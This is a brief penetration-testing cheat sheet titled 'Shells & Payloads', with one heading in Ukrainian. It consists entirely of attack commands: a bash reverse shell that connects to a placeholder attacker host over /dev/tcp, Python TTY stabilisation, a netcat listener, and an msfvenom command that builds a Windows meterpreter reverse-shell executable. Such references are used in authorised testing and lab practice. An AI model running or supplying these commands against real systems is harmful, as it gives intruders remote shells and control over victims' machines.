# Shells & Payloads

## Reverse shell (Linux)
```bash
bash -i >& /dev/tcp/<ATTACKER>/443 0>&1
```
## Стабілізація TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z; stty raw -echo; fg; export TERM=xterm
```
## Listener
```bash
rlwrap nc -lvnp 443
```
## msfvenom (Windows)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=443 -f exe -o s.exe
```
